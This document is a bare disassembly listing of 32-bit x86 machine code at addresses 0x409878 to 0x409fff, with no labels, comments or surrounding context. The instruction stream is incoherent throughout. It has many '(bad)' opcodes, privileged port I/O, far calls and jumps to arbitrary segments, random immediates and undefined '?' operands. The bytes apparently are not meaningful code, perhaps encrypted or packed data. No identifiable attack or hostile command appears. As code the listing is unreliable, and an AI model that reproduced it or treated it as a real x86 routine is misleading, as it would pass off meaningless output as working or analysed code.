  409878:	sub    eax,DWORD PTR [edi]
  40987a:	cli    
  40987b:	inc    eax
  40987c:	inc    ecx
  40987d:	xchg   ebx,eax
  40987e:	retf   
  40987f:	adc    eax,0xa7e2570d
  409884:	stos   BYTE PTR es:[edi],al
  409885:	vminss xmm7,xmm5,DWORD PTR [ecx+0x1d]
  40988a:	in     eax,dx
  40988b:	sbb    dh,BYTE PTR [ebx-0x14]
  40988e:	scas   al,BYTE PTR es:[edi]
  40988f:	cmp    DWORD PTR [esi],edi
  409891:	xchg   ebx,eax
  409892:	jno    0x4098ec
  409894:	xor    ah,BYTE PTR [ebx+0x71]
  409897:	out    0x63,eax
  409899:	(bad)  
  40989a:	arpl   WORD PTR [edi-0x1b50136b],sp
  4098a0:	daa    
  4098a1:	add    eax,0x7247b6c7
  4098a6:	mov    al,ds:0xedc1f4a7
  4098ab:	in     eax,dx
  4098ac:	inc    ecx
  4098ad:	pop    es
  4098ae:	loop   0x409911
  4098b0:	stc    
  4098b1:	and    ebx,DWORD PTR [esi+0x7842c8ff]
  4098b7:	(bad)  
  4098b8:	adc    al,0x65
  4098ba:	pushf  
  4098bb:	xor    bh,BYTE PTR [ebp-0x55]
  4098be:	retf   
  4098bf:	arpl   WORD PTR [edi+0xc],bx
  4098c2:	dec    esi
  4098c3:	nop
  4098c4:	jle    0x4098c7
  4098c6:	fiadd  WORD PTR [esp+ecx*4+0x12a9fe1b]
  4098cd:	and    esi,DWORD PTR [ebx-0x1ada373]
  4098d3:	mov    esp,0xf3f67bc4
  4098d8:	sbb    BYTE PTR [ebp+0x2a],cl
  4098db:	cdq    
  4098dc:	gs emms 
  4098df:	mov    edi,0x2725b91d
  4098e4:	sub    ecx,ebp
  4098e6:	dec    edx
  4098e7:	jb     0x4098e6
  4098e9:	call   0xa3ff:0x371f5242
  4098f0:	mov    fs,ecx
  4098f2:	mov    eax,0x8d2d7d59
  4098f7:	mov    bl,0x53
  4098f9:	in     al,dx
  4098fa:	mov    eax,ds:0xa11932b0
  4098ff:	push   edx
  409900:	add    al,0xe2
  409902:	pushf  
  409903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409904:	(bad)  
  409905:	xchg   edi,esi
  409907:	scas   eax,DWORD PTR es:[edi]
  409908:	(bad)  
  409909:	(bad)  
  40990a:	nop
  40990b:	gs pop esi
  40990d:	out    0xd2,al
  40990f:	mov    cl,0x7e
  409911:	xor    ch,BYTE PTR [edx-0x54]
  409914:	aad    0x24
  409916:	sub    eax,0x14fdb483
  40991b:	ret    
  40991c:	mov    WORD PTR [ebx+ecx*4],ds
  40991f:	mov    esi,DWORD PTR [ecx]
  409921:	cmp    DWORD PTR [ebx+esi*1+0x59a8b331],eax
  409928:	fldenv [edi-0x1ffa50ce]
  40992e:	call   0x150d:0xc62b3c55
  409935:	and    ch,BYTE PTR [edx+0x6]
  409938:	pushf  
  409939:	mov    ebx,DWORD PTR [eax]
  40993b:	mov    dh,0x17
  40993d:	mov    bh,0x25
  40993f:	xlat   BYTE PTR ds:[ebx]
  409940:	stos   DWORD PTR es:[edi],eax
  409941:	push   es
  409942:	add    al,0x28
  409944:	(bad)  
  409945:	mov    ah,BYTE PTR [eax+0x77fbbac8]
  40994b:	dec    edx
  40994c:	lds    ebx,FWORD PTR [ecx-0x80]
  40994f:	in     eax,0xb8
  409951:	jnp    0x409943
  409953:	into   
  409954:	sbb    DWORD PTR [eax],edi
  409956:	addr16 stc 
  409958:	sbb    BYTE PTR [eax-0xb],0xb2
  40995c:	lock ror BYTE PTR [esi],0xc2
  409960:	int3   
  409961:	ret    0xb5fb
  409964:	or     eax,0x6f35dc4f
  409969:	pop    edi
  40996a:	(bad)  
  40996b:	into   
  40996c:	push   ebp
  40996d:	sbb    ebp,DWORD PTR [ebx+0x6a]
  409970:	add    ah,0xa5
  409973:	clc    
  409974:	cmp    al,0x64
  409976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409977:	lods   al,BYTE PTR ds:[esi]
  409978:	mov    DWORD PTR [ebx],esp
  40997a:	outs   dx,BYTE PTR ds:[esi]
  40997b:	inc    ebx
  40997c:	sbb    ecx,ecx
  40997e:	push   edx
  40997f:	sub    ecx,esi
  409981:	lock loop 0x4099a3
  409984:	add    eax,0xd7f0de71
  409989:	jl     0x409963
  40998b:	sahf   
  40998c:	inc    esi
  40998d:	jnp    0x409980
  40998f:	mov    eax,ds:0x5b4fcebc
  409994:	push   eax
  409995:	push   edx
  409996:	test   al,0x47
  409998:	(bad)  
  409999:	mov    bl,0x1f
  40999b:	or     BYTE PTR [ecx-0x7],ah
  40999e:	mov    es,ebp
  4099a0:	mov    esp,0x8ed60191
  4099a5:	jmp    0x4099ab
  4099a7:	icebp  
  4099a8:	xlat   BYTE PTR ds:[ebx]
  4099a9:	add    ch,BYTE PTR [edi+0x12589ee8]
  4099af:	sbb    eax,0xc94957a2
  4099b4:	aaa    
  4099b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099b6:	mov    al,0x60
  4099b8:	data16 out dx,al
  4099ba:	push   ss
  4099bb:	in     eax,dx
  4099bc:	jmp    0x8081:0x9f2a3d56
  4099c3:	push   0x88d1e570
  4099c8:	mov    edi,DWORD PTR [eax+eax*8]
  4099cb:	adc    eax,0xd459b488
  4099d0:	popf   
  4099d1:	(bad)  
  4099d2:	fdivr  QWORD PTR [ecx-0x5b]
  4099d5:	or     DWORD PTR [ebp+0x52],esi
  4099d8:	rcl    BYTE PTR [ebp+0x7c],cl
  4099db:	fild   WORD PTR [ebx+ecx*2]
  4099de:	jne    0x4099d9
  4099e0:	pop    ds
  4099e1:	mov    eax,0x309d25a5
  4099e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099e7:	dec    ecx
  4099e8:	aaa    
  4099e9:	cmp    esp,DWORD PTR [edx+0x75326024]
  4099ef:	enter  0x4eff,0x22
  4099f3:	nop
  4099f4:	mov    edi,0x914c2439
  4099f9:	sub    eax,0xa2edd942
  4099fe:	scas   eax,DWORD PTR es:[edi]
  4099ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a00:	push   cs
  409a01:	pop    ecx
  409a02:	hlt    
  409a03:	jno    0x409a81
  409a05:	sti    
  409a06:	xor    al,0x8a
  409a08:	inc    esp
  409a09:	sbb    BYTE PTR [esi+0x7c42c7b3],ah
  409a0f:	fbstp  TBYTE PTR [ecx+0xa19c009]
  409a15:	push   0x5bcef8c3
  409a1a:	mov    BYTE PTR [ebx+0x6],ah
  409a1d:	rcr    DWORD PTR [ebx+esi*8-0x59],cl
  409a21:	lahf   
  409a22:	jp     0x4099b9
  409a24:	outs   dx,DWORD PTR ds:[esi]
  409a25:	(bad)  
  409a26:	and    dl,bh
  409a28:	je     0x409a5b
  409a2a:	xor    bl,BYTE PTR [edi+ebx*1-0x645e2e32]
  409a31:	mov    eax,0x28508251
  409a36:	cdq    
  409a37:	adc    bl,BYTE PTR [ecx-0x677c544a]
  409a3d:	dec    edx
  409a3e:	mov    al,0xb3
  409a40:	pand   mm3,QWORD PTR [esi]
  409a43:	mov    edi,0x4670518b
  409a48:	jg     0x409a9d
  409a4a:	aas    
  409a4b:	ror    BYTE PTR [eax],0xce
  409a4e:	mov    esi,0xa0120776
  409a53:	out    0x8,al
  409a55:	repz sbb ebp,esp
  409a58:	sahf   
  409a59:	add    edi,DWORD PTR [edx]
  409a5b:	shl    ah,0xb5
  409a5e:	or     cl,BYTE PTR [esi]
  409a60:	push   ds
  409a61:	arpl   WORD PTR [ebp-0x74],bx
  409a64:	adc    esi,DWORD PTR [edi-0x51]
  409a67:	pop    ebp
  409a68:	dec    edx
  409a69:	push   es
  409a6a:	addr16 push 0x69
  409a6d:	(bad)  [edx+0x3b]
  409a70:	addr16 data16 std 
  409a73:	mov    ebx,0x67dfcf65
  409a78:	test   al,0x56
  409a7a:	(bad)  [edi+0x842fa96]
  409a80:	inc    ebp
  409a81:	xchg   ecx,eax
  409a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a83:	xor    esi,ebp
  409a85:	mov    edi,0xbe3538ea
  409a8a:	pusha  
  409a8b:	ficom  DWORD PTR [ebp-0x152e8b7a]
  409a91:	dec    esp
  409a92:	xchg   esi,eax
  409a93:	ret    0xa9f6
  409a96:	aas    
  409a97:	loop   0x409a7f
  409a99:	loop   0x409abb
  409a9b:	mov    ds:0xaf59c27,eax
  409aa0:	sub    al,0xcd
  409aa2:	jl     0x409b12
  409aa4:	inc    ebp
  409aa5:	xchg   ebp,eax
  409aa6:	in     eax,0xef
  409aa8:	ret    0x83bc
  409aab:	push   ecx
  409aac:	sbb    al,0xb0
  409aae:	xor    eax,0xaab8aead
  409ab3:	jns    0x409aea
  409ab5:	or     ah,BYTE PTR [ebp-0x1c]
  409ab8:	cmp    ah,BYTE PTR [ebx+0x3b]
  409abb:	pop    ecx
  409abc:	cs dec edx
  409abe:	loope  0x409ab3
  409ac0:	outs   dx,DWORD PTR ds:[esi]
  409ac1:	xchg   edi,eax
  409ac2:	fimul  DWORD PTR [ebx]
  409ac4:	jg     0x409a61
  409ac6:	push   edx
  409ac7:	xchg   edx,eax
  409ac8:	xor    bl,ch
  409aca:	into   
  409acb:	xchg   esp,eax
  409acc:	dec    esp
  409acd:	jnp    0x409acd
  409acf:	mov    ss,WORD PTR gs:[ebx]
  409ad2:	lods   eax,DWORD PTR ds:[esi]
  409ad3:	jg     0x409b10
  409ad5:	cmp    esp,ebx
  409ad7:	imul   edx,DWORD PTR [edx],0x248b6057
  409add:	adc    cl,dl
  409adf:	aad    0x46
  409ae1:	loop   0x409aec
  409ae3:	mov    al,ds:0x8e02e1d0
  409ae8:	xchg   ebx,eax
  409ae9:	jp     0x409ad0
  409aeb:	add    bl,BYTE PTR [eax-0x6944aede]
  409af1:	(bad)  
  409af3:	lock mov ebx,0x73f3a75
  409af9:	sti    
  409afa:	out    0xf4,al
  409afc:	mov    al,0xfa
  409afe:	mov    dl,0x33
  409b00:	pop    ebp
  409b01:	push   ebp
  409b02:	xchg   edx,eax
  409b03:	push   ebp
  409b04:	popa   
  409b05:	xchg   ebx,eax
  409b06:	out    dx,al
  409b07:	mov    ds:0xd5eddb67,eax
  409b0c:	fdivr  QWORD PTR [ebx]
  409b0e:	sbb    eax,DWORD PTR [ecx]
  409b10:	shr    dl,0x78
  409b13:	aaa    
  409b14:	xchg   ebx,eax
  409b15:	and    ebx,DWORD PTR [ebp+0x788fc41e]
  409b1b:	push   ss
  409b1c:	fnstcw WORD PTR [edx+0x7f]
  409b1f:	aad    0x3d
  409b21:	iret   
  409b22:	es jmp 0x35e09386
  409b28:	out    0x8d,eax
  409b2a:	stos   BYTE PTR es:[edi],al
  409b2b:	js     0x409ad3
  409b2d:	(bad)  
  409b2e:	mov    bh,0x71
  409b30:	inc    edi
  409b31:	icebp  
  409b32:	out    0xb4,al
  409b34:	ds adc ah,cl
  409b37:	pop    ss
  409b38:	mov    WORD PTR [edx],ds
  409b3a:	cli    
  409b3b:	cmp    DWORD PTR [eax],ebx
  409b3d:	or     edx,DWORD PTR [edi]
  409b3f:	add    eax,0x484e6d01
  409b44:	jae    0x409b08
  409b46:	or     ebx,esp
  409b48:	inc    ecx
  409b49:	mov    edx,0xb1555437
  409b4e:	xor    DWORD PTR [esp+ebp*2-0xd107f2f],ecx
  409b55:	push   ecx
  409b56:	mov    WORD PTR [edx+0x23],cs
  409b59:	inc    ebp
  409b5a:	pushf  
  409b5b:	sbb    eax,0x81a23f75
  409b60:	inc    esp
  409b61:	sbb    DWORD PTR ds:0xc7637935,ebp
  409b67:	or     bl,BYTE PTR [ecx]
  409b69:	les    esp,FWORD PTR [ebx+0xe281499]
  409b6f:	adc    DWORD PTR [eax],eax
  409b71:	in     eax,0x88
  409b73:	sbb    edi,edx
  409b75:	out    0x39,al
  409b77:	imul   ecx,DWORD PTR [ebx+0x33],0x9bcaeebc
  409b7e:	mov    ch,0xe9
  409b80:	iret   
  409b81:	add    eax,0x8ba0865f
  409b86:	sbb    al,BYTE PTR [ebp+0x8a4955d]
  409b8c:	push   0x58b9f802
  409b91:	and    cl,BYTE PTR gs:[edx+0x146bad4f]
  409b98:	dec    ebx
  409b99:	outs   dx,BYTE PTR ds:[esi]
  409b9a:	or     dh,BYTE PTR [edx]
  409b9c:	out    dx,eax
  409b9d:	jne    0x409b8e
  409b9f:	mov    bh,0x95
  409ba1:	adc    bh,BYTE PTR [ebp+0x7d945db3]
  409ba7:	pushf  
  409ba8:	repz push ebx
  409baa:	push   esp
  409bab:	mov    bl,0xcd
  409bad:	xchg   ebx,eax
  409bae:	test   DWORD PTR [ebp+0x69],0x3082efe7
  409bb5:	stos   DWORD PTR es:[edi],eax
  409bb6:	rcl    al,cl
  409bb8:	jae    0x409b6b
  409bba:	stc    
  409bbb:	xchg   ecx,eax
  409bbc:	sub    al,0x4c
  409bbe:	mov    dl,0x8a
  409bc0:	call   0x73f9:0xa504380b
  409bc7:	imul   eax,DWORD PTR ds:0xca5e537a,0x3031fe24
  409bd1:	jne    0x409b97
  409bd3:	stos   BYTE PTR es:[edi],al
  409bd4:	add    eax,0x7daaa531
  409bd9:	mov    ah,0x10
  409bdb:	add    eax,0x50c31380
  409be0:	das    
  409be1:	mov    al,0xc0
  409be3:	mov    ecx,0x253430df
  409be8:	iret   
  409be9:	ja     0x409c26
  409beb:	int    0x1
  409bed:	sub    dl,BYTE PTR [eax-0x60]
  409bf0:	add    BYTE PTR [ebp+0x62],ah
  409bf3:	xchg   BYTE PTR [edx-0x2115062],dh
  409bf9:	mov    WORD PTR [edx+0x4e],?
  409bfc:	and    DWORD PTR [esp+ebp*4-0x7c108875],0xffffffce
  409c04:	xchg   edx,eax
  409c05:	pop    esp
  409c06:	push   cs
  409c07:	pop    ecx
  409c08:	rcr    DWORD PTR [edx],1
  409c0a:	dec    edi
  409c0b:	mov    BYTE PTR [edi+0x63f7ae95],bl
  409c11:	adc    edi,DWORD PTR [esi+0x37]
  409c14:	in     al,0x5c
  409c16:	jo     0x409bbd
  409c18:	or     DWORD PTR ds:0xf97eee4c,ebp
  409c1e:	mov    esp,0x7f156e7a
  409c23:	fsub   st,st(3)
  409c25:	popf   
  409c26:	sub    ah,ch
  409c28:	pop    ebx
  409c29:	jns    0x409ca4
  409c2b:	pop    edi
  409c2c:	xor    al,0x1
  409c2e:	test   eax,0x81560972
  409c33:	xor    DWORD PTR [ebp+0x3242af13],esi
  409c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c3a:	sbb    eax,0x6d95ba96
  409c3f:	inc    ebx
  409c40:	cli    
  409c41:	and    al,BYTE PTR [edi-0x80]
  409c44:	add    eax,0x23eacdae
  409c49:	bound  edi,QWORD PTR [esi+0x4d37556c]
  409c4f:	popa   
  409c50:	popa   
  409c51:	push   esi
  409c52:	ins    BYTE PTR es:[edi],dx
  409c53:	imul   ebx,DWORD PTR [ebx],0x1a
  409c56:	sbb    edx,DWORD PTR [esi-0x4]
  409c59:	fs into 
  409c5b:	mov    ebx,0x9bf6a0e2
  409c60:	ja     0x409c68
  409c62:	(bad)  
  409c63:	(bad)  
  409c64:	sti    
  409c65:	(bad)
  409c68:	clc    
  409c69:	adc    BYTE PTR [eax],dh
  409c6b:	in     eax,0xbc
  409c6d:	in     eax,0x74
  409c6f:	adc    DWORD PTR [eax+0x469ad369],ebp
  409c75:	sbb    esp,esp
  409c77:	sub    bh,ah
  409c79:	int3   
  409c7a:	ror    edi,0x22
  409c7d:	sbb    ecx,esi
  409c7f:	jae    0x409c8a
  409c81:	dec    ebx
  409c82:	inc    esi
  409c83:	out    dx,al
  409c84:	cmp    al,0xe9
  409c86:	jp     0x409cd0
  409c88:	out    0x70,eax
  409c8a:	(bad)  
  409c8b:	jbe    0x409d02
  409c8d:	and    eax,0x48bc9039
  409c92:	add    ch,BYTE PTR [edx-0x1d43bb60]
  409c98:	fwait
  409c99:	test   al,0x98
  409c9b:	or     eax,0x739642b6
  409ca0:	pop    es
  409ca1:	or     eax,0xf6c2832a
  409ca6:	push   edi
  409ca7:	repnz xchg esi,eax
  409ca9:	jae    0x409c3f
  409cab:	jge    0x409ca5
  409cad:	cmp    dh,BYTE PTR [esi]
  409caf:	jg     0x409c92
  409cb1:	ret    0xdd22
  409cb4:	jmp    0x409d32
  409cb6:	and    DWORD PTR [esi+eiz*1-0x3c005685],esp
  409cbd:	arpl   WORD PTR [eax-0x6b],bp
  409cc0:	ss repz mov ah,0x96
  409cc4:	jmp    0xf4ec2346
  409cc9:	push   0xa6de3f7d
  409cce:	push   ebp
  409ccf:	xchg   edi,eax
  409cd0:	aad    0xe8
  409cd2:	pop    eax
  409cd3:	and    ecx,esp
  409cd5:	jecxz  0x409cfb
  409cd7:	fistp  DWORD PTR [ebx-0x2ace39cc]
  409cdd:	add    BYTE PTR [ecx+eax*1+0x5e3a8a21],dh
  409ce4:	in     eax,dx
  409ce5:	or     bh,cl
  409ce7:	cld    
  409ce8:	pop    eax
  409ce9:	mov    eax,DWORD PTR [ebp+0x1e]
  409cec:	fcmovbe st,st(1)
  409cee:	mov    ds:0x8208b1c2,eax
  409cf3:	add    al,0xe
  409cf5:	stos   BYTE PTR es:[edi],al
  409cf6:	popf   
  409cf7:	mov    ds:0xbc6ea6d7,eax
  409cfc:	push   eax
  409cfd:	mov    bh,0x8d
  409cff:	loopne 0x409cf1
  409d01:	ja     0x409d41
  409d03:	jae    0x409d44
  409d05:	push   cs
  409d06:	xor    WORD PTR [ecx+esi*1+0x2765dd9a],bp
  409d0e:	or     BYTE PTR [eax-0x94392a8],dl
  409d14:	stos   BYTE PTR es:[edi],al
  409d15:	(bad)  
  409d16:	adc    BYTE PTR [ecx-0x4],dh
  409d19:	ja     0x409d6a
  409d1b:	inc    ebx
  409d1c:	dec    esi
  409d1d:	xchg   edi,eax
  409d1e:	push   ss
  409d1f:	lahf   
  409d20:	dec    ebx
  409d21:	xchg   DWORD PTR [ebx],eax
  409d23:	fld    DWORD PTR [edx+0x2d]
  409d26:	rcr    ebp,cl
  409d28:	fwait
  409d29:	pop    esi
  409d2a:	mov    esp,DWORD PTR [ecx+edi*4+0xdef1975]
  409d31:	test   BYTE PTR [edi-0x263f9a0],dl
  409d37:	dec    edx
  409d38:	retf   
  409d39:	jp     0x409d73
  409d3b:	push   ebp
  409d3c:	ficom  DWORD PTR [eax+0x25]
  409d3f:	imul   ecx,DWORD PTR [ebx+ecx*2-0x3fc20f6a],0x7b5a737f
  409d4a:	call   0x4ecc23d4
  409d4f:	mov    eax,DWORD PTR [esi-0x55]
  409d52:	int    0x4a
  409d54:	mov    ah,0x43
  409d56:	je     0x409d8e
  409d58:	js     0x409d7c
  409d5a:	pop    ebp
  409d5b:	jle    0x409d59
  409d5d:	outs   dx,DWORD PTR ds:[esi]
  409d5e:	inc    esi
  409d5f:	xor    edi,esp
  409d61:	loope  0x409de1
  409d63:	cwde   
  409d64:	clc    
  409d65:	test   ebx,edi
  409d67:	(bad)  
  409d68:	adc    al,0x6d
  409d6a:	pop    esp
  409d6b:	daa    
  409d6c:	(bad)  
  409d6d:	jp     0x409dbb
  409d6f:	push   ebp
  409d70:	or     eax,0xb878fa43
  409d75:	sub    WORD PTR [ebx+0x1a9adc67],si
  409d7c:	pop    ds
  409d7d:	or     eax,0xa17e6d67
  409d82:	or     BYTE PTR [ebx+edi*1],al
  409d85:	out    0x74,eax
  409d87:	mov    al,ds:0x98eab74a
  409d8c:	rcr    DWORD PTR [edx+0x3ba783dc],1
  409d92:	adc    eax,0xbfb17f76
  409d97:	cmp    al,0x16
  409d99:	xchg   edx,eax
  409d9a:	add    BYTE PTR [esi],al
  409d9c:	mov    ecx,0xb530dcb6
  409da1:	and    DWORD PTR [edx+0x752c88d7],ecx
  409da7:	mov    ds:0x6d3616ce,eax
  409dac:	leave  
  409dad:	jae    0x409dfa
  409daf:	arpl   WORD PTR [ecx-0xe],dx
  409db2:	data16 imul BYTE PTR [edi]
  409db5:	mov    ebp,0x240d7029
  409dba:	into   
  409dbb:	sbb    eax,0x30097d64
  409dc0:	cwde   
  409dc1:	cli    
  409dc2:	inc    esp
  409dc3:	mov    ds:0xe4f66eda,al
  409dc8:	loop   0x409e36
  409dca:	xor    dl,BYTE PTR [ecx+0x58]
  409dcd:	jl     0x409d54
  409dcf:	xchg   edi,eax
  409dd0:	pop    eax
  409dd1:	push   edi
  409dd2:	imul   esp,DWORD PTR [ecx-0x80],0xb860ca45
  409dd9:	pop    ds
  409dda:	test   eax,0x97bc5678
  409ddf:	push   es
  409de0:	pop    ecx
  409de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de2:	and    DWORD PTR [edx-0x1c],edi
  409de5:	in     al,0xff
  409de7:	hlt    
  409de8:	test   DWORD PTR [ecx+ebp*1-0x2],edi
  409dec:	push   edi
  409ded:	adc    BYTE PTR [edi-0x33],dh
  409df0:	adc    al,BYTE PTR [eax+0x33]
  409df3:	mov    bl,0xec
  409df5:	adc    al,0x66
  409df7:	outs   dx,DWORD PTR ds:[esi]
  409df8:	xor    BYTE PTR [eax],ch
  409dfa:	cmp    ecx,DWORD PTR [esi]
  409dfc:	scas   al,BYTE PTR es:[di]
  409dfe:	(bad)  
  409dff:	add    edi,DWORD PTR [edx-0x18dd654]
  409e05:	sbb    ah,0x5a
  409e08:	fild   WORD PTR [eax-0x6ae18c19]
  409e0e:	int3   
  409e0f:	in     eax,dx
  409e10:	jecxz  0x409de4
  409e12:	stc    
  409e13:	add    al,0xf1
  409e15:	inc    esp
  409e16:	xor    al,0xfc
  409e18:	xor    DWORD PTR [edx],ecx
  409e1a:	test   BYTE PTR [ebx],dh
  409e1c:	inc    eax
  409e1d:	adc    bl,BYTE PTR [ebx]
  409e1f:	mov    ecx,0x779fc03a
  409e24:	out    dx,eax
  409e25:	in     al,dx
  409e26:	push   ds
  409e27:	sbb    ebx,DWORD PTR [esi]
  409e29:	dec    ecx
  409e2a:	jb     0x409dda
  409e2c:	out    0xf5,al
  409e2e:	or     ch,cl
  409e30:	push   ebx
  409e31:	xor    eax,0x6e5c2559
  409e36:	adc    al,bh
  409e38:	mov    dh,0x57
  409e3a:	mov    bl,0xeb
  409e3c:	lea    edx,[esi+0x30]
  409e3f:	or     DWORD PTR [eax-0x33cfcfc9],ebp
  409e45:	inc    edx
  409e46:	std    
  409e47:	xor    dh,ch
  409e49:	or     ecx,DWORD PTR [ebp+0x41]
  409e4c:	ss das 
  409e4e:	fild   QWORD PTR [edi+0x61fbbf7f]
  409e54:	lahf   
  409e55:	cdq    
  409e56:	pop    ds
  409e57:	outs   dx,BYTE PTR ds:[esi]
  409e58:	push   cs
  409e59:	sbb    BYTE PTR [ebp+0x4a],bl
  409e5c:	inc    edi
  409e5d:	ins    DWORD PTR es:[edi],dx
  409e5e:	out    0xf3,eax
  409e60:	fisttp QWORD PTR [ecx]
  409e62:	icebp  
  409e63:	fcom   DWORD PTR [eax-0x6accc64f]
  409e69:	jns    0x409e7b
  409e6b:	mov    BYTE PTR [edi],bh
  409e6d:	xchg   ebp,eax
  409e6e:	push   ebx
  409e6f:	mov    al,ds:0x5ad951e9
  409e74:	xchg   edx,eax
  409e75:	std    
  409e76:	add    eax,0x8171787f
  409e7b:	fisttp QWORD PTR [edi+0x66]
  409e7e:	cmp    edx,DWORD PTR [esi-0x7a]
  409e81:	cmp    BYTE PTR [esi],0x93
  409e84:	stos   BYTE PTR es:[edi],al
  409e85:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e87:	iret   
  409e88:	or     eax,eax
  409e8a:	cdq    
  409e8b:	xchg   esp,eax
  409e8c:	and    eax,0x86e9edd3
  409e91:	out    0xc5,eax
  409e93:	out    dx,eax
  409e94:	jge    0x409ed4
  409e96:	cs loop 0x409e79
  409e99:	std    
  409e9a:	adc    edi,DWORD PTR [eax+0x40a06908]
  409ea0:	sbb    ah,cl
  409ea2:	xchg   edx,eax
  409ea3:	jmp    0xa8fb:0xbae49203
  409eaa:	fistp  DWORD PTR [edx-0x18e69af8]
  409eb0:	mov    bh,0x39
  409eb2:	push   ds
  409eb3:	out    0x85,eax
  409eb5:	push   0xffffffea
  409eb7:	les    esi,FWORD PTR [eax-0x69]
  409eba:	lods   al,BYTE PTR ds:[esi]
  409ebb:	test   al,0x26
  409ebd:	sub    dl,ch
  409ebf:	mov    ?,WORD PTR [edi+0x5cac4900]
  409ec5:	pop    edi
  409ec6:	xchg   dl,ah
  409ec8:	psubd  mm4,mm5
  409ecb:	mov    eax,ds:0x861d61e9
  409ed0:	cli    
  409ed1:	pop    ds
  409ed2:	gs loop 0x409eee
  409ed5:	loopne 0x409e6e
  409ed7:	rol    eax,1
  409ed9:	enter  0xfa2a,0x1c
  409edd:	(bad)  
  409ede:	mov    ds,WORD PTR [edi-0x1]
  409ee1:	aaa    
  409ee2:	sbb    eax,0xa41c1308
  409ee7:	jns    0x409f29
  409ee9:	outs   dx,BYTE PTR ds:[esi]
  409eea:	js     0x409e72
  409eec:	cmp    eax,0x73dd19a0
  409ef1:	or     al,0x64
  409ef3:	cmp    eax,0x29d672dd
  409ef8:	or     al,0x63
  409efa:	enter  0x317b,0xc3
  409efe:	das    
  409eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f00:	(bad)  
  409f01:	xchg   edx,eax
  409f02:	test   BYTE PTR [ecx+0x21],bl
  409f05:	cmp    ecx,DWORD PTR [esi-0x42]
  409f08:	push   esi
  409f09:	xchg   esi,eax
  409f0a:	gs or  bl,dh
  409f0d:	xchg   DWORD PTR [esi],esi
  409f0f:	lea    esi,[ecx+0x60e8709c]
  409f15:	(bad)  
  409f16:	das    
  409f17:	or     al,0x2e
  409f19:	push   cs
  409f1a:	dec    esp
  409f1b:	iret   
  409f1c:	fwait
  409f1d:	addr16 push ebx
  409f1f:	test   al,0xe5
  409f21:	in     eax,0xa8
  409f23:	xor    al,0x5
  409f25:	rol    DWORD PTR [ebx+0x3b423bd0],0xec
  409f2c:	cmp    eax,0x4440cf04
  409f31:	aaa    
  409f32:	(bad)  
  409f33:	pop    ecx
  409f34:	stos   DWORD PTR es:[edi],eax
  409f35:	fld    QWORD PTR [eax]
  409f37:	push   es
  409f38:	sbb    dl,BYTE PTR [si]
  409f3b:	fdivr  DWORD PTR [edi]
  409f3d:	ins    BYTE PTR es:[edi],dx
  409f3e:	push   0xffffffb4
  409f40:	or     ebp,ebx
  409f42:	outs   dx,BYTE PTR ds:[esi]
  409f43:	jp     0x409efb
  409f45:	(bad)  
  409f46:	dec    ecx
  409f47:	data16 aad 0xa6
  409f4a:	jle    0x409f5f
  409f4c:	rcl    al,1
  409f4e:	das    
  409f4f:	pop    ds
  409f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f51:	ins    DWORD PTR es:[edi],dx
  409f52:	add    DWORD PTR [ebx],ecx
  409f54:	sub    ah,BYTE PTR [ebx]
  409f56:	or     bh,ah
  409f58:	daa    
  409f59:	mov    esp,0x6099b9c4
  409f5e:	inc    ecx
  409f5f:	inc    ebx
  409f60:	test   ebp,0x7dfad121
  409f66:	mov    eax,edi
  409f68:	mov    ebx,0x8fe14f6
  409f6d:	push   es
  409f6e:	jae    0x409f6c
  409f70:	out    0x2f,eax
  409f72:	shl    esi,0xf8
  409f75:	outs   dx,DWORD PTR ds:[esi]
  409f76:	or     DWORD PTR [edi-0x15],ebx
  409f79:	jbe    0x409eff
  409f7b:	lods   eax,DWORD PTR ds:[esi]
  409f7c:	sub    dh,al
  409f7e:	dec    ebx
  409f7f:	adc    eax,0x123ee47f
  409f84:	add    ch,al
  409f86:	lock sub eax,0x38fe98d4
  409f8c:	clc    
  409f8d:	jge    0x409f40
  409f8f:	test   al,0xce
  409f91:	and    al,0x5f
  409f93:	scas   eax,DWORD PTR es:[edi]
  409f94:	das    
  409f95:	jbe    0x409f83
  409f97:	mov    edi,0x40e4c8b
  409f9c:	jg     0x409fe8
  409f9e:	call   0xb023:0xc07d76c
  409fa5:	cmp    al,0x5e
  409fa7:	ror    esi,cl
  409fa9:	mov    ebx,0x9f95dfcc
  409fae:	mov    esp,0x58b590d
  409fb3:	and    DWORD PTR [edi-0x72],ebx
  409fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fb8:	pop    edi
  409fb9:	inc    edi
  409fba:	(bad)  
  409fbb:	(bad)
  409fc0:	fwait
  409fc1:	popf   
  409fc2:	xchg   ebx,eax
  409fc3:	lea    ebx,[edi]
  409fc5:	adc    BYTE PTR [ebx+eiz*8],bh
  409fc8:	in     al,dx
  409fc9:	jge    0x409f78
  409fcb:	arpl   WORD PTR [ebx],ax
  409fcd:	add    DWORD PTR [ecx],ebp
  409fcf:	cmp    DWORD PTR [ecx-0x66],edx
  409fd2:	pop    eax
  409fd3:	popf   
  409fd4:	lods   al,BYTE PTR ds:[si]
  409fd6:	in     al,dx
  409fd7:	cmp    esi,DWORD PTR [ebp+0xb]
  409fda:	dec    ebx
  409fdb:	mov    edx,0xd5c867f
  409fe0:	jae    0x409f6d
  409fe2:	retf   
  409fe3:	mov    ds,WORD PTR [ecx]
  409fe5:	enter  0x76b9,0xe8
  409fe9:	pop    esp
  409fea:	aas    
  409feb:	lahf   
  409fec:	jl     0x40a069
  409fee:	jge    0x40a009
  409ff0:	pop    edx
  409ff1:	cmp    ah,bl
  409ff3:	pop    esi
  409ff4:	sti    
  409ff5:	mov    al,0x66
  409ff7:	into   
  409ff8:	mov    esp,0xd897d689
  409ffd:	test   edi,esi
  409fff:	fmul   QWORD PTR [eax+0x40]
